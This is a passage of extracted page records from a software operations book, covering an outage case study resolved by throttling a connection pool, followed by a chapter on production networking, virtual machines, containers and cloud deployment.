      "content": "Diagnostic Tests • 135\n\nIt was now almost an hour since I got the call, or ninety minutes since the site went down. This means not only lost orders for my client but also that we were coming close to missing our SLA for resolving a high-severity incident. I hate missing an SLA. I take it personally, as do all of my colleagues.\n\nDiagnostic Tests\n\nThe thread dumps on the front-end application servers revealed a similar pattern across all the DRPs. A few threads were busy making a call to the back end, and most of the others were waiting for an available connection to call the back end. The waiting threads were all blocked on a resource pool, one that had no timeout. If the back end stopped responding, then the threads making the calls would never return, and the ones that were blocked would never get their chance to make their calls. In short, every single request- handling thread, all 3,000 of them, were tied up doing nothing, perfectly explaining our observation of low CPU usage: all 100 DRPs were idle, waiting forever for an answer that would never come.\n\nAttention swung to the order management system. Thread dumps on that system revealed that some of its 450 threads were occupied making calls to an external integration point, as shown in the following figure. As you probably have guessed, all other threads were blocked waiting to make calls to that external integration point. That system handles scheduling for home delivery. We immediately paged the operations team for that system. (It’s managed by a different group that does not have 24/7 support staff. They pass a pager around on rotation.)\n\nOnlineStoreSiteScopeNYC\n\nCustomers\n\nSiteScopeSan Francisco20 Hosts75 DRPs3,000 Threads\n\nOrderManagement6 Hosts6 Instances450 Threads\n\nreport erratum • discuss",
      "content_length": 1781,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 146,
      "content": "Chapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 136\n\nI think it was about this time that my wife brought me a plate of leftover turkey and stuffing for dinner. Between status reports, I muted the phone to take quick bites. By that point, I had used up the battery on my cell phone and was close to draining the cordless phone. (I couldn’t use a regular phone because none of them took my headset plug.) I crossed my fingers that my cell phone would get enough of a charge before the cordless phone ran out.\n\nCall In a Specialist\n\nIt felt like half of forever (but was probably only half an hour) when the support engineer dialed in to the bridge. He explained that of the four servers that normally handle scheduling, two were down for maintenance over the holiday weekend and one of the others was malfunctioning for reasons unknown. To this day, I have no idea why they would schedule maintenance for that weekend of all weekends!\n\nThat left us with a huge imbalance in the sizes of the systems, as shown in the following figure. The sole scheduling server that remained could handle up to twenty-five concurrent requests before it started to slow down and hang. We estimated that right then the order management system was probably sending it ninety requests. Sure enough, when the on-call engineer checked the lone scheduling server, it was stuck at 100 percent CPU. He had gotten paged a few times about the high CPU condition but had not responded, since that group routinely gets paged for transient spikes in CPU usage that turn out to be false alarms. All the false positives had quite effectively trained them to ignore high CPU conditions.\n\nOnlineStoreSiteScopeNYC\n\nCustomers\n\nSiteScopeSan Francisco20 Hosts75 DRPs3,000 Threads\n\nOrderManagement6 Hosts6 Instances450 Threads\n\nScheduling1 Host1 Instance25 Threads\n\nreport erratum • discuss",
      "content_length": 1875,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 147,
      "content": "Compare Treatment Options • 137\n\nOn the conference call, our business sponsor gravely informed us that marketing had prepared a new insert that hit newspapers Friday morning. The ad offered free home delivery for all online orders placed before Monday. The entire line, with fifteen people in a conference room on speakerphone and a dozen more dialed in from their desks, went silent for the first time in four hours.\n\nSo, to recap, we have the front-end system, the online store, with 3,000 threads on 100 servers and a radically changed traffic pattern. It’s swamping the order management system, which has 450 threads that are shared between handling requests from the front end and processing orders. The order man- agement system is swamping the scheduling system, which can barely handle twenty-five requests at a time.\n\nAnd it’s going to continue until Monday. It’s the nightmare scenario. The site is down, and there’s no playbook for this situation. We’re in the middle of an incident, and we have to improvise a solution.\n\nCompare Treatment Options\n\nBrainstorming ensued. Numerous proposals were thrown up and shot down, generally because the application code’s behavior under those circumstances was unknown. It quickly became clear that the only answer was to stop making so many requests to check schedule availability. With the weekend’s marketing campaign centered around free home delivery, we knew requests from the users were not about to slow down. We had to find a way to throttle the calls. The order management system had no way to do that.\n\nWe saw a glimmer of hope when we looked at the code for the store. It used a subclass of the standard resource pool to manage connections to order management. In fact, it had a separate connection pool just for scheduling requests. I’m not sure why the code was designed with a separate connection pool for that, probably an example of Conway’s law, but it saved the day— and the retail weekend. Because it had a component just for those connec- tions, we could use that component as our throttle.\n\nIf the developers had added an enabled property, it would have been a simple thing to set that to false. Maybe we could do the next best thing, though. A resource pool with a zero maximum is effectively disabled anyway. I asked the developers what would happen if the pool started returning null instead of a connection. They replied that the code would handle that and present the user with a polite message stating that delivery scheduling was not available for the time being. Good enough.\n\nreport erratum • discuss",
      "content_length": 2581,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 148,
      "content": "Chapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 138\n\nDoes the Condition Respond to Treatment?\n\nOne of my Perl scripts could set the value of any property on any component. As an experiment, I used the script to set max for that resource pool (on just one DRP) to zero, and I set checkoutBlockTime to zero. Nothing happened. No change in behavior at all. Then I remembered that max has an effect only when the pool is starting up.\n\nI used another script, one that could invoke methods on the component, to call its stopService() and startService() methods. Voilà! That DRP started handling requests again! There was much rejoicing.\n\nOf course, because only one DRP was responding, the load manager started sending every single page request to that one DRP. It was crushed like the last open beer stand at a World Cup match. But at least we had a strategy.\n\nRecovery-Oriented Computing\n\nThe Recovery-Oriented Computing (ROC) project was a joint Berkeley and Stanford research project.a The project’s founding principles are as follows:\n\nFailures are inevitable, in both hardware and software.\n\nModeling and analysis can never be sufficiently complete. A priori prediction of\n\nall failure modes is not possible.\n\nHuman action is a major source of system failures.\n\nTheir research runs contrary to much of the prior work in system reliability. Whereas most work focuses on eliminating the sources of failure, ROC accepts that failures will inevitably happen—a major theme in this book! Their investigations aim to improve survivability in the face of failures.\n\nThe concepts of ROC were ahead of their time in 2005. Now they seem natural in the world of microservices, containers, and elastic scaling.\n\na.\n\nhttp://roc.cs.berkeley.edu\n\nI ran my scripts, this time with the flag that said “all DRPs.” They set max and checkoutBlockTime to zero and then recycled the service.\n\nThe ability to restart components, instead of entire servers, is a key concept of recovery-oriented computing. Although we didn’t have the level of automation that ROC proposes, we were able to recover service without rebooting the world. If we had needed to change the configuration files and restart all the servers, it would have taken more than six hours under that level of load.\n\nreport erratum • discuss",
      "content_length": 2307,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 149,
      "content": "Winding Down • 139\n\nDynamically reconfiguring and restarting just the connection pool took less than five minutes (once we knew what to do.)\n\nAlmost immediately after my scripts finished, we saw user traffic getting through. Page latency started to drop. About ninety seconds later, the DRPs went green in SiteScope. The site was back up and running.\n\nWinding Down\n\nI wrote a new script that would do all the actions needed to reset that connec- tion pool’s maximum. It set the max property, stopped the service, and then restarted the service. With one command, an engineer in the operations center or in the “command post” (that is, the conference room) at the client’s site could reset the maximum connections to whatever it needed to be. I would later learn that script was used constantly through the weekend. Because setting the max to zero completely disabled home delivery, the business sponsor wanted it increased when load was light and decreased to one (not zero) when load got heavy.\n\nWe closed out the call. I hung up and went to tuck my kids into bed. It took a while. They were full of news about going to the park, playing in the sprin- kler, and seeing baby rabbits in the backyard. I wanted to hear all about it.\n\nreport erratum • discuss",
      "content_length": 1256,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 150,
      "content": "CHAPTER 7\n\nFoundations\n\nIn the last chapter, the operations team, my client, and I narrowly avoided a financial disaster. It was a difficult situation, and the “solution” was not exactly ideal. All of us would have been happier if it’d never happened. My team couldn’t fix the underlying problem—the delivery scheduling servers were outside our control. But I was able to diagnose the problem, and the operations center partially mitigated its effects. That was only possible because we already had good visibility into the running system. There certainly wasn’t time to add a bunch of logging calls inside the application. With runtime vis- ibility, though, new logging wasn’t necessary. The applications revealed their problems. To apply the solution, we exercised control over the running system. There’s no way we could have recovered if we’d had to reboot the servers after every configuration change.\n\nThe next few chapters cover those key ingredients, leading us to a concept of “design for production.” Design for production means thinking about produc- tion issues as first-class concerns. That includes the production network, which might be considerably different from your development environment. It also includes logging and monitoring, runtime control, and security. Design for production also means designing for the people who do operations, whether they are a dedicated ops team or integrated with development. Operators are users, too. They may not be logged in to a beautifully designed front-end application, but they get to interact with your system through its configuration, control, and monitoring interfaces. If your system’s front end is Disney World, then operators get to use the secret tunnels beneath the park.\n\nIn the next several chapters, we will work through layers of concerns. As you can see in the figure on page 142, everything starts with the physical infras- tructure. We’ll discuss that in this chapter. The next chapters each zoom out one step at a time to encompass wider, more distributed concerns as we go.\n\nreport erratum • discuss",
      "content_length": 2078,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 151,
      "content": "Chapter 7. Foundations • 142\n\nFoundationHardware, VMs, IP addresses, physical network\n\nInstancesServices, processes, components, instance monitoring\n\nInterconnectRouting, load balancing, failover, traﬃc management\n\nControl PlaneSystem monitoring, deployment, anomaly detection, features\n\nOperationsSecurity, availability, capacity, status, communication\n\nYou may notice that the words “as a service” don’t appear anywhere in the dia- gram above. The distinctions between “Infrastructure as a Service” and “Platform as a Service” were never strong to begin with. As vendors have sliced, diced, and triangulated their way across the landscape, those classifications have broken down completely. It’s more useful to look at different technology platforms in terms of those layers of responsibility: Which layers do they drive/does the platform drive completely by API? Which responsibilities move from operations to developers, and in which layers? What responsibilities remain application- level concerns and what is moved behind software-driven abstractions?\n\nThis chapter starts with the first layer. Operations leads us into design for production considerations by looking at the physical fundamentals of the sys- tem: the machines and wires that everything else builds upon. The first order of business is to clear up some things about networks, hostnames, and IP addresses. After that, it’s time to talk about the code holders: physical hosts, virtual machines, and containers. Each kind of deployment has its own set of concerns that software designs must account for. Finally, we’ll look at some special concerns that arise when a system spans multiple data centers.\n\nNetworking in the Data Center and the Cloud\n\nNetworking in the data center and the cloud takes more than opening a socket. These networks incorporate more redundancy and security than desktop networks. Add in a layer or two of virtualization, and applications and services can behave very differently than they do in the safe confines of the IDE. They require some additional work to behave properly in this environment.\n\nreport erratum • discuss",
      "content_length": 2119,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 152,
      "content": "Networking in the Data Center and the Cloud • 143\n\nNICs and Names\n\nOne of the great misunderstandings in networking is about the hostname of a machine. That’s because hostname can be defined in two distinct ways. First, a hostname is the name an operating system uses to identify itself. This is what you see when you run the “hostname” command. The administrator of the machine can set that hostname and the “default search domain.” Together, the concatenation of the hostname and search domain is called the fully qualified domain name (FQDN.)\n\nThe second definition of hostname pertains to the external name of the system. Other computers expect to connect to the target machine using that hostname. When a program tries to connect to a particular hostname, it resolves that name via DNS. DNS resolves the desired name, maybe through a recursive query up to higher authorities, and ultimately returns an IP address.\n\nDid you spot the discrepancy? There’s no guarantee that the machine’s own FQDN matches the FQDN that DNS has for its IP address. In other words, a machine may have its FQDN set to “spock.example.com” but have a DNS mapping as “mail.example.com” and “www.example.com.” The fundamental disconnect is that a machine uses its hostname to identify the whole machine, while a DNS name identifies an IP address. Multiple DNS names can resolve to the same IP address. For load-balanced services, a DNS name can also resolve to multiple IP addresses. That means “DNS name to IP address” is a many-to- many relationship. But the machine still acts as if it has exactly one hostname. Many utilities and programs assume that the machine’s self-assigned FQDN is a legitimate DNS name that resolves back to itself. This is largely true for development machines and largely untrue for production services.\n\nThere’s another many-to-many relationship in the mix as well. A single machine may have multiple network interface controllers (NICs.) If you run “ifconfig” on a Linux or Mac machine, or “ipconfig” on a Windows machine, you’ll probably see several NICs listed. Each NIC can be attached to a different network. Each active NIC gets an IP address on its particular network. This is called multihoming. Nearly every server in a data center will be multihomed.\n\nA dev box usually has multiple NICs for the sake of mobility. One will be a wired Ethernet port (for those desktops or laptops that have wired Ethernet). Another NIC will be for Wi-Fi. Both of those have physical hardware handling them. A loopback NIC is a virtual device. It handles good old 127.0.0.1.\n\nData center machines are multihomed for different purposes. They enforce security by separating administration and monitoring onto a different network. They may improve performance by segmenting high-volume traffic, such as\n\nreport erratum • discuss",
      "content_length": 2824,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 153,
      "content": "Chapter 7. Foundations • 144\n\nbackups, away from the production traffic. These networks have different security requirements, and an application that is not aware of the multiple network interfaces will easily end up accepting connections from the wrong networks. For example, it could accept administrative connections from the production network or offer production functionality over the backup network.\n\nAs shown in the following figure, this single server has four different network interfaces. The Unix convention is to use the driver type followed by a digit. In Linux, these would be eth0 through eth3. For Solaris, they could be ce0 through ce3 or qfe0 through qfe3, depending on the network card and driver version. Win- dows would give the interfaces incredibly long and unwieldy names by default.\n\nServer\n\nSwitch 1\n\nSwitch 2\n\nBackupSwitch\n\nAdminSwitch\n\nnic0nic1nic2nic3172.16.64.190172.16.32.19010.10.1.190192.168.104.190\n\nOf the four interfaces, two of them are dedicated to “production” traffic. These handle the application’s functionality. If the server is a web server, then these handle the incoming requests and send the replies back. In this example, both interfaces are for production traffic. Because these are running to differ- ent switches, the server appears to be configured for high availability. These two interfaces might be load balanced, or they might be set up as a failover pair. As shown, two different IP addresses will get packets to this server. That means there are probably DNS entries for both addresses. In other words, this machine has more than one name! It has its own internal hostname— the string returned by the hostname command—but from the outside, more than one name reaches this host.\n\nAnother common configuration for multiple production interfaces is bonding, or teaming. In this configuration, both interfaces share a common IP address.\n\nreport erratum • discuss",
      "content_length": 1917,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 154,
      "content": "Networking in the Data Center and the Cloud • 145\n\nThe operating system ensures that an individual packet goes out over only one interface. Bonded interfaces can be configured to automatically balance outbound traffic or to prefer one link or the other. Bonded interfaces that connect to different switches require some additional configuration on the switches, or else routing loops can result. You’ll certainly be famous if you cause a routing loop in the data center, but not in a good way.\n\nThe two additional “back-end” interfaces are dedicated to special-purpose traffic. Because backups transfer huge volumes of data in bursts, they can clog up a production network. Therefore, good network design for the data center partitions the backup traffic onto its own network segment. These are sometimes handled by separate switches and sometimes just by separate VLANs on the production switches. With backup traffic partitioned off from the production network, application users don’t necessarily suffer when the backups run. (They might, if the server doesn’t have enough I/O bandwidth to process backups and application traffic at the same time. Nevertheless, users of other applications don’t suffer when this server is being backed up.)\n\nFinally, many data centers have a specific network for administrative access. This is an important security protection, because services such as SSH can be bound only to the administrative interface and are therefore not accessible from the production network. This can help if a firewall gets breached by an attacker or if the server handles an internal application and doesn’t sit behind a firewall.\n\nProgramming for Multiple Networks\n\nThis multitude of interfaces affects the application software. By default, an application that listens on a socket will listen for connection attempts on any interface. Language libraries always have an “easy” version of listening on a socket. The easy version just opens a socket on every interface on the host. Bad news! Instead, we have to do it the hard way and specify which IP address we are opening the socket for:\n\n// Bad approach ln, err := net.Listen(\"tcp\", \":8080\")\n\n// Good approach ln, err := net.Listen(\"tcp\", \"spock.example.com:8080\")\n\nTo determine which interfaces to bind to, the application must be told its own name or IP addresses. This is a big difference with multihomed servers. In development, the server can always call its language-specific version of getLocal- Host(), but on a multihomed machine, this simply returns the IP address associ- ated with the server’s internal hostname. This could be any of the interfaces,\n\nreport erratum • discuss",
      "content_length": 2655,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 155,
      "content": "Chapter 7. Foundations • 146\n\ndepending on local naming conventions. Therefore, server applications that need to listen on sockets must add configurable properties to define to which interfaces the server should bind.\n\nOutbound Connections\n\nUnder exceedingly rare conditions, an application also has to specify which interface it wants traffic to leave from when connecting to a target IP address. For production systems, I would regard this as a configuration error in the host: it means multiple routes reach the same destination, hooked to different NICs.\n\nThe exception is when two NICs connected to two switches are bonded into a single interface. Suppose “en0” and “en1” are connected to different switches, but also bonded as “bond0.” Without any additional guidance, an application opening an outbound connection won’t know which interface to use. The solution is to ensure that the routing table has a default gateway using “bond0.”\n\nWith that under our belts, we now have enough networking knowledge to talk about the hosts and the layers of virtualization on them.\n\nPhysical Hosts, Virtual Machines, and Containers\n\nAt some level, all machines are the same. Eventually, all our software runs on some piece of precisely patterned silicon. All our data winds up on glass platters of spinning rust or encoded in minute charges on NAND gates. That’s where the similarity ends. A bewildering array of deployment options force us to think about the machines’ identities and lifespans. These aren’t just packaging issues, either. A design that works nicely in a physical data center environment may cost too much or fail utterly in a containerized cloud envi- ronment. In this section, we’ll look at these deployment options and how they affect software architecture and design for each kind of environment.\n\nPhysical Hosts\n\nThe CPU is one place where the data center and the development boxes have converged. Pretty much everything these days runs a multicore Intel or AMD x86 processor running in 64-bit mode. Clock speeds are pretty much the same, too. If anything, development machines tend to be a bit beefier than the average pizza box in the data center these days. That’s because the story in the data center is all about expendable hardware.\n\nThis is a huge shift from just ten years ago. Before the complete victory of commodity pricing and web scale, data center hardware was built for high reliability of the individual box. Our philosophy now is to load-balance services\n\nreport erratum • discuss",
      "content_length": 2513,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 156,
      "content": "Physical Hosts, Virtual Machines, and Containers • 147\n\nacross enough hosts that the loss of a single host is not catastrophic. In that environment, you want each host to be as cheap as possible.\n\nThere are two exceptions to this rule. Some workloads require large amounts of RAM in the box. Think “graph processing” rather than ordinary HTTP request/response applications. The other specialized workload is GPU com- puting. Some algorithms are “embarrassingly parallel,” so it makes sense to run them across thousands of vector-processing cores.\n\nData center storage still comes in a bewildering variety of forms and sizes. Most of the useful storage won’t be directly on the individual hosts. In fact, your development machine probably has more storage than one of your data center hosts will have. The typical data center host has enough storage to hold a bunch of virtual machine images and offer some fast local persistent space. Most of the bulk space will be available either as SAN or NAS. Don’t be fooled by the similarity in those acronyms. Bloody trench wars have been fought between the two camps. (It’s easier to make trenches in a data center than you might think. Just pop up a few raised floor panels.) To an application running on the host, though, both of them just look like another mount point or drive letter. Your application doesn’t need to care too much about what protocol the storage speaks. Just measure the throughput to see what you’re dealing with. Bonnie 64 will give you a reasonable view with a minimum of fuss.1\n\nAll in all, the picture is much simpler today than it once was. Design for produc- tion hardware for most applications just means building to scale horizontally. Look out for those specialized workloads and shift them to their own boxes. For the most part, however, our applications won’t be running directly on the hardware. The virtualization wave of the early 2000s left no box behind.\n\nVirtual Machines in the Data Center\n\nVirtualization promised developers a common hardware appearance across the bewildering array of physical configurations in the data center. It promised data center managers that it would rein in “server sprawl” and pack all those extra web servers running at 5 percent utilization into a high-density, high- utilization, easily managed whole. Guess which story turned out to be more compelling?\n\nOn the down side, performance is much less predictable. Many virtual machines can reside on the same physical hosts. It’s rare to see VMs move from one host to another, because it’s disruptive to the guest. (The “host\n\n1.\n\nhttps://sourceforge.net/projects/bonnie64\n\nreport erratum • discuss",
      "content_length": 2660,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 157,
      "content": "Chapter 7. Foundations • 148\n\noperating system” is the one that really runs on hardware. It provides the virtualization features. “Guest operating systems” run in the virtual machines.) Physical hosts are usually oversubscribed. That means the physical host may have 16 cores, but the total number of cores allocated to VMs on the host is 32. That host would be 200 percent subscribed or 100 percent oversubscribed. If all those applications receive requests at the same time, just through random chance, then there’s not enough CPU to go around.\n\nAlmost any resource on the host can be oversubscribed, especially CPU, RAM, and network. Regardless of resource, the result is always the same: contention among VMs and random slowdowns for all. It’s virtually impossible for the guest OS to monitor for this.\n\nWhen designing applications to run in virtual machines (meaning pretty much all applications today) you must make sure that they’re not sensitive to the loss or slowdown of any one host. That’s just a good idea anyway, but it’s particularly important here. Here are some things to watch out for:\n\nDistributed programming techniques that require synchronous responses\n\nfrom the whole cluster for work to proceed\n\n“Special” machines like cluster managers or lock managers, unless\n\nanother machine can take over without reconfiguration\n\nSubtle dependency on request or event ordering—nobody designs this\n\ninto a system, but it can creep in unexpectedly.\n\nVirtual machines make all the problems with clocks much worse. Most pro- grammers carry a mental model of the clock as being monotonic and sequential. That is, a program that samples the system clock may get the same value twice but it’ll never get a value less than a prior response. It turns out that’s not even true for a clock on a physical machine. But on a virtual machine it can be much worse. Between two calls to examine the clock, the virtual machine can be suspended for an indefinite span of real time. It might even be migrated to a different physical host that has a clock skew relative to the original host. A clock on a virtual machine is not necessarily monotonic or sequential. The virtualization tools try to paper over this with a little com- munication from the VM to query the host so the VM can update its OS clock whenever it wakes up. That keeps the VM’s OS clock synced with the host’s OS clock. From an application perspective, this makes the clock jump around even more. The bottom line is: don’t trust the OS clock. If external, human time is important, use an external source like a local NTP server.\n\nreport erratum • discuss",
      "content_length": 2616,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 158,
      "content": "Physical Hosts, Virtual Machines, and Containers • 149\n\nContainers in the Data Center\n\nContainers have invaded the data center, pushed there by developer insistence. Containers promise to deliver the process isolation and packaging of a virtual machine together with a developer-friendly build process. The container hypothesis says, “I’ll never again have to ask if production matches QA.”\n\nContainers in the data center act a lot like virtual machines in the cloud (see Virtual Machines in the Cloud, on page 152). Any individual container only has a short-lived identity. As a result, it should not be configured on a per-instance basis. This can cause interesting effects with older monitoring systems (looking at you, Nagios!) that need to be reconfigured and bounced every time a machine is added or removed.\n\nA container won’t have much, if any, local storage, so the application must rely on external storage for files, data, and maybe even cache.\n\nThe most challenging part of running containers in the data center is definitely the network. By default, a container doesn’t expose any of its ports (on its own virtual interface) on the host machine. You can selectively forward ports from the container to the host, but then you still have to connect them from one host to another. One common pattern that’s developing is the overlay network. This uses virtual LANs (VLANs)—see Virtual LANs for Virtual Machines, on page 150 —to create a virtual network just among the containers. The overlay network has its own IP address space and does its own routing with software switches running on the hosts. Within the overlay network, some control plane software manages the whole ensemble of containers, VLANs, IPs, and names.\n\nA close second for “hardest problem in container-world” is making sure enough container instances of the right types are on the right machines. Containers are meant to come and go—part of their appeal is their very fast startup time (think milliseconds rather than minutes). But that means container instances will be like quantum foam burbling across all your hosts. Manually operating containers would be absurd. Instead, we delegate that job to another bit of control plane software. We describe our desired load out of the containers, and the software spreads container meringue across the physical hosts. The control software should know something about the geographic distribution of the hosts as well. That way it can allocate instances regionally for low latency while maintaining availability in case you lose a data center.\n\nIt seems natural that the same software should schedule container instances and manage their network settings, right? Solutions for running containers in data centers are emerging. None are dominant at this time, but packages like Kubernetes, Mesos, and Docker Swarm are attacking both the networking\n\nreport erratum • discuss",
      "content_length": 2892,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 159,
      "content": "Chapter 7. Foundations • 150\n\nVirtual LANs for Virtual Machines\n\nAs if there weren’t enough ways for a packet to hit a pocket on a socket on a port, we’ve got virtual LANs (VLANs) and virtual extensible LANs (VXLANs) to contend with. The idea of a VLAN is to multiplex Ethernet frames on a single wire but let the switch treat them like they came in from totally separate networks. The VLAN tag is a number from 1 to 4,094 that nestles into the physical routing portion of the header. Every network you encounter will support VLANs.\n\nThe operating system that runs a NIC can create a virtual device assigned to a virtual LAN. Then all the packets sent by that device will have that VLAN ID in them. That also means the virtual device must have its own IP address in a subnet assigned to that VLAN.\n\nVXLAN takes the same idea but runs it at “layer 3,” meaning it’s visible to IP on the host. It also uses 24 more bits in the IP header, so a physical network can have more than 16 million VXLANs riding its wires.\n\nAt one time this was all the province of network engineers pulling cables around the data center. Virtualization and containers increasingly rely on software switches to handle dynamic updates. It will be common to see software switches running on the hosts, presenting a complete network environment to the containers that does the following:\n\nAllows containers to “believe” they’re on isolated networks • Supports load-balancing via virtual IPs • Uses a firewall as a gateway to the external network\n\nWhile this technology matures, our container systems have to provide their own load- balancing and need to be told which IP addresses and ports their peers are on.\n\nand allocation problem. Whichever one solves this problem first will be able to truly claim the title of “operating system for the data center.”\n\nWhen you design an application for containers, keep a few things in mind. First, the whole container image moves from environment to environment, so the image can’t hold things like production database credentials. Creden- tials all have to be supplied to the container. A 12-factor app handles this naturally. If you’re not using that style, think about injecting configuration when starting the container. In either case, look into password vaulting.\n\nThe second thing to externalize is networking. Container images should not contain hostnames or port numbers. Again, that’s because the setting needs to change dynamically while the container image stays the same. Links between containers are all established by the control plane when starting them up.\n\nreport erratum • discuss",
      "content_length": 2609,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 160,
      "content": "Physical Hosts, Virtual Machines, and Containers • 151\n\nThe 12-Factor App\n\nOriginally created by engineers at Heroku, the 12-factor app is a succinct description of a cloud-native, scalable, deployable application.a Even if you’re not running in a cloud, it makes a great checklist for application developers.\n\nThe “factors” identify different potential impediments to deployment, with recommend- ed solutions for each:\n\nCodebase\n\nTrack one codebase in revision control. Deploy the same build to every environment.\n\nDependencies\n\nExplicitly declare and isolate dependencies.\n\nConfig\n\nStore config in the environment.\n\nBacking services\n\nTreat backing services as attached resources.\n\nBuild, release, run\n\nStrictly separate build and run stages.\n\nProcesses\n\nExecute the app as one or more stateless processes.\n\nPort binding\n\nExport services via port binding.\n\nConcurrency\n\nScale out via the process model.\n\nDisposability\n\nMaximize robustness with fast startup and graceful shutdown.\n\nDev/prod parity\n\nKeep development, staging, and production as similar as possible.\n\nLogs\n\nTreat logs as event streams.\n\nAdmin processes\n\nRun admin/management tasks as one-off processes.\n\nSee the website for greater detail on each of these recommendations.\n\na.\n\nhttps://12factor.net\n\nreport erratum • discuss",
      "content_length": 1289,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 161,
      "content": "Chapter 7. Foundations • 152\n\nContainers are meant to start and stop rapidly. Avoid long startup or initial- ization sequences. Some production servers take many minutes to load refer- ence data or to warm up caches. These are not suited for containers. Aim for a total startup time of one second.\n\nFinally, it’s notoriously hard to debug an application running inside a con- tainer. Just getting access to log files can be a challenge. Don’t even bother trying to figure out why some socket is being held open for too long. Con- tainerized applications, even more than ordinary ones, need to send their telemetry out to a data collector.\n\nVirtual Machines in the Cloud\n\nAt the time of writing, Amazon Web Services is far and away the dominant cloud platform. Google Cloud is gaining traction thanks to an attractive pricing model, but it has a long way to go before its workload approaches AWS. The world can change pretty quickly, though. While advanced cloud features definitely help with lock-in, compute and storage capacity is more fungible.\n\nIt’s evident now that traditional applications can run in the cloud. No matter what we say about “lift and shift” efforts, they do run. Despite that, a cloud native system will have better operational characteristics, especially in terms of availability and cost.\n\nAny individual virtual machine in the cloud has worse availability than any individual physical machine (assuming equally skilled data center engineering and operations). If you think about it in terms of “moving parts,” you’ll see why that has to be the case. A virtual machine in the cloud runs atop a physical host, but with an extra operating system in the middle. It can be started or stopped without notice by the management APIs (in other words, the “control plane” software.) It also shares the physical host with other vir- tual machines and may contend for resources. If you’ve been running in AWS for any length of time, you’ll have encountered virtual machines that got killed for no apparent reason. If you have long-running virtual machines, you may even have gotten a notice from AWS informing you that the machine has to be restarted (or else!).\n\nAnother factor that presents a challenge to traditional applications is the ephemeral nature of machine identity. A machine ID and its IP address are only there as long as the machine keeps running. Most traditional application configurations keep hostnames or IP addresses in config files. But in AWS, a VM’s IP address changes on every boot. If your application needs to keep\n\nreport erratum • discuss",
      "content_length": 2580,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 162,
      "content": "Wrapping Up • 153\n\nthose addresses in files, then you have to rent Elastic IP addresses from Amazon. That works well enough until you need a lot of them. A basic AWS account has a limit on how many addresses it can procure.\n\nThe general rule is that VMs have to “volunteer” to do work, rather than having a controller dole the work out. That means a new VM should be able to start up and join whatever pool of workers handles load. For HTTP requests, autoscaling and load balancers (either elastic load balancers or application load balancers) are the way to go. For asynchronous load, use competing consumers on a queue.\n\nWhen it comes to network interfaces on those cloud VMs, the default is pretty simple: one NIC with a private IP address. This isn’t always what you want, though. There’s a limit to how much traffic a single NIC can support, based on the number of sockets available. Socket numbers only range from 1 to 65535, so at best a single NIC can support about 64,000 connections. You may want to set up more production NICs just to handle more simultaneous connections. Another good reason to set up another NIC is for monitoring and management traffic. In particular, it’s a bad idea to have SSH ports available on front-end NICs for every server. It’s better to set up a single entry point (a “bastion” or “jumphost” server) with strong logging on SSH connections and then use the private network to get from there to other VMs.\n\nNetworking these VMs together presents its own set of challenges and solutions.\n\nContainers in the Cloud\n\nContainers on cloud VMs combine the challenges of both containers and the cloud. The containers have short-lived, ephemeral identities. Connecting them means linking ports across different VMs, possibly in different zones or regions. Designing individual services to run in this kind of deployment is not that much different from designing them to run in containers in the data center. Most of the big challenges arise from building those containers into a whole system. In a sense, using containers pushes some complexity out of the boxes and into the control plane. (We’ll look at the control plane in Chapter 10, Control Plane, on page 193.)\n\nWrapping Up\n\nThe range of deployment environments has widened thanks to cloud comput- ing and platform-as-a-service offers. These environments move the boundary of responsibility back and forth between application development, platform\n\nreport erratum • discuss",
      "content_length": 2459,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 163,
      "content": "Chapter 7. Foundations • 154\n\ndevelopment, operations, and infrastructure. Despite that, some considerations are common to every kind of environment:\n\nHow is the network structured? Is there just one or are there several?\n\nWill a machine have NICs on different networks with different jobs?\n\nDo machines have long-lasting identities?\n\nAre machines automatically set up and torn down? If so, how do we\n\nmanage the images for them?\n\nFinding or building the answer to these questions never appears on a Kanban board or a Jira ticket, but they’re essential to making a smooth transition to operations.\n\nGiven a stable foundation to build upon, we need to look at how individual machine instances in that environment will behave and how we will control them. We’ll look at those issues in the next chapter.\n\nreport erratum • discuss",
      "content_length": 827,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 164,
      "content": "CHAPTER 8\n\nProcesses on Machines\n\nIn the last chapter, we looked at a diverse set of network and physical envi- ronments that our software may be deployed into. In this chapter, we’re going to focus on the individual instances. They need to be good citizens by providing transparency, accepting control, handling configuration nicely, and managing connections. We’ll see some natural overlap with the stability patterns from Chapter 5, Stability Patterns, on page 91, since it’s the job of each instance to accept stress and insults with tolerance and grace.\n\nIn the car business, they say the engine needs fuel, fire, and air to work. Our version of that is code, config, and connection. Every machine needs the right code, configuration, and network connections. One problem we’re going to run into is that our vocabulary hasn’t really kept up with our technology. For instance, when some people say “server” they might mean a virtual machine running on a physical host in their data center. Others might mean a process inside an operating system, rather than a whole machine image. Technology like containers blur the lines further. A process in a container is also a process on the operating system that hosts the container. Which one should we call the “server?” At the risk of seeming hopelessly pedantic, we’ll try to agree on some terms that may help disambiguate the rest of this section.\n\nService\n\nA collection of processes across machines that work together to deliver a unit of functionality. A service may have processes from multiple executables (for example, application code plus a database). One service may present a single IP address with load balancing behind the scenes. (More on that in Chapter 9, Interconnect, on page 171.) On the other hand, it may have multiple IP addresses using the same DNS name.\n\nInstance An installation on a single machine (container, virtual, or physical) out of a load-balanced array of the same executable. A service can be made of multiple different types of executables, but when we talk about\n\nreport erratum • discuss",
      "content_length": 2073,
      "extraction_method": "Unstructured"
    },
